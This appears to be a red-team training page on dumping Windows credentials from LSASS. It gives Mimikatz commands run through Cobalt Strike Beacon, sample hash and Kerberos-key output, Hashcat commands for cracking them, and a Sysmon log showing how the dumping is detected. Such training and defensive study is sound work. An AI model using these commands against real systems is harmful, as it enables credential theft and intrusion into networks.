
OS Credential Dumping is a technique [T1003](https://attack.mitre.org/techniques/T1003/) where an adversary extracts credential material, that are either stored or cached, from the Operating System.  Each sub-technique detailed here requires SYSTEM privileges to the computer.

### LSASS Memory

The Local Security Authority Subsystem Service (LSASS) on Windows is responsible for  verifying the credentials of users when logging in, handling password changes, creating access tokens, and so on.  An adversary may be able to read passwords cached inside memory of the LSASS process [T1003.001](https://attack.mitre.org/techniques/T1003/001/)

Microsoft provides something called the Security Support Provider Interface (SSPI), which is their implementation of the Generic Security Service API (GSSAPI).   SSPs are used to provide different authentication mechanisms for Windows, including:

- _NTLM_ for authentication via NTLM and NTLMv2.
- _Kerberos_ for authentication via Kerberos v5. 
- _Digest_ for Lightweight Directory Access Protocol (LDAP) and web authentication.
- _Schannel_ for authentication via public key cryptography, such as TLS and SSL.
- Credential Security Service Provider (_CredSSP_) for single sign-on with Terminal Services and Remote Desktop sessions.

Each SSP is implemented as separate DLLs, which are loaded by LSASS when the system starts.  Each SSP will therefore handle, structure, and credentials in different ways.  This is relevant to know, because some tools, such as Mimikatz, have specific commands depending on which SSP you want to read from.

An implementation of Mimikatz is built into Cobalt Strike.  The `mimikatz` command can be used to run any arbitrary Mimikatz command, and there are other commands which act as aliases for commonly-used functionality.  The command can also be pre-pended with a `!` or `@` character (which is unique to Cobalt Strike's implementation) which adds some extra steps.  Use `!` to make Mimikatz elevate to SYSTEM before running the specified command.  This is required by some commands, such as `lsadump::sam`.  Use `@` to make Mimikatz impersonate Beacon's thread token before running the specified command.  This is useful when impersonating users and running commands that interact with remote resources, such as `lsadump::dcsync`.

### NTLM Hashes

The `logonpasswords` command is an alias for `sekurlsa::logonpasswords` which can dump NTLM hashes for users that have recently authenticated to the computer.

```powershell
beacon> mimikatz sekurlsa::logonpasswords

User Name         : pchilds
Domain            : CONTOSO
Logon Server      : LON-DC-1
Logon Time        : 17/02/2025 09:45:28
SID               : S-1-5-21-3926355307-1661546229-813047887-1105
	msv :	
	 [00000003] Primary
	 * Username : pchilds
	 * Domain   : CONTOSO
	 * NTLM     : fc525c9683e8fe067095ba2ddc971889
	 * SHA1     : e53d7244aa8727f5789b01d8959141960aad5d22
	 * DPAPI    : 650b40d81e1d02eb6908bbcefcf78732

User Name         : rsteel
Domain            : CONTOSO
Logon Server      : LON-DC-1
Logon Time        : 17/02/2025 09:53:40
SID               : S-1-5-21-3926355307-1661546229-813047887-1108
	msv :	
	 [00000003] Primary
	 * Username : rsteel
	 * Domain   : CONTOSO
	 * NTLM     : fc525c9683e8fe067095ba2ddc971889
	 * SHA1     : e53d7244aa8727f5789b01d8959141960aad5d22
	 * DPAPI    : c249dfed28f9c95fa91792eed37d2444
```

These can be cracked using hash mode 1000 in Hashcat.

```powershell
PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 1000 .\ntlm.hash .\example.dict -r .\rules\dive.rule fc525c9683e8fe067095ba2ddc971889:Passw0rd!
```

Or they can be used with the [pass-the-hash](https://www.zeropointsecurity.co.uk/path-player?courseid=red-team-ops&unit=6731fbc37399aa8c4905789c) technique.

### Kerberos Keys

Mimikatz's `sekurlsa::ekeys` command will dump user's Kerberos encryption keys.

```powershell
User Name         : pchilds
Domain            : CONTOSO
Logon Server      : LON-DC-1
Logon Time        : 17/02/2025 09:45:28
SID               : S-1-5-21-3926355307-1661546229-813047887-1105

	 * Username : pchilds
	 * Domain   : CONTOSO.COM
	 * Password : (null)
	 * Key List :
	   des_cbc_md4       7fae91afb4f60917ffa16c09283f3978ac71dff4e34d738d268bb49311f6c77d
	   des_cbc_md4       fc525c9683e8fe067095ba2ddc971889
	   des_cbc_md4       fc525c9683e8fe067095ba2ddc971889
	   des_cbc_md4       fc525c9683e8fe067095ba2ddc971889
	   des_cbc_md4       fc525c9683e8fe067095ba2ddc971889
	   des_cbc_md4       fc525c9683e8fe067095ba2ddc971889

User Name         : rsteel
Domain            : CONTOSO
Logon Server      : LON-DC-1
Logon Time        : 17/02/2025 09:53:40
SID               : S-1-5-21-3926355307-1661546229-813047887-1108

	 * Username : rsteel
	 * Domain   : CONTOSO.COM
	 * Password : (null)
	 * Key List :
	   des_cbc_md4       05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960
	   des_cbc_md4       fc525c9683e8fe067095ba2ddc971889
	   des_cbc_md4       fc525c9683e8fe067095ba2ddc971889
	   des_cbc_md4       fc525c9683e8fe067095ba2ddc971889
	   des_cbc_md4       fc525c9683e8fe067095ba2ddc971889
	   des_cbc_md4       fc525c9683e8fe067095ba2ddc971889
```

> Note that Mimikatz incorrectly labels each hash as _des_cbc_md4_.  The hash at the top has a length of 64 and is _aes256-cts-hmac-sha1-96_.  You may also see _aes128-cts-hmac-sha1-96_ and _rc4_hmac_ which are 32 in length.

You can technically crack AES256 but they are much slower compared to NTLM because they are salted.  My 4070 GPU benchmarks NTLM at 140 GH/s and AES256 at only 1375 kH/s.  The hash format required by Hashcat is `$krb5db$18$<username>$<DOMAIN-FQDN>$<hash>` and can be cracked using hash mode 28900.

```powershell
PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 28900 .\sha256.hash .\example.dict -r .\rules\dive.rule
$krb5db$18$rsteel$CONTOSO.COM$05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960:Passw0rd!
```

# OPSEC

Dumping credentials from LSASS is generally a bad idea from an OPSEC perspective, and best avoided where possible.  Security drivers can use the [ObRegisterCallbacks](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-obregistercallbacks) kernel function to get notified when one process opens a handle to another process.  Here's an example log generated by Sysmon when credentials are dumped from LSASS.

```powershell
Process accessed:

SourceProcessId: 5744
SourceThreadId: 4724
SourceImage: C:\Windows\system32\rundll32.exe
TargetProcessId: 772
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1010
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9d9b4|C:\Windows\System32\KERNELBASE.dll+338ae|UNKNOWN(00000202CDF78124)
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM
```

> The **GrantedAccess** mask of `0x1010` is consistent with `PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ`, which are the minimum privileges required for reading memory.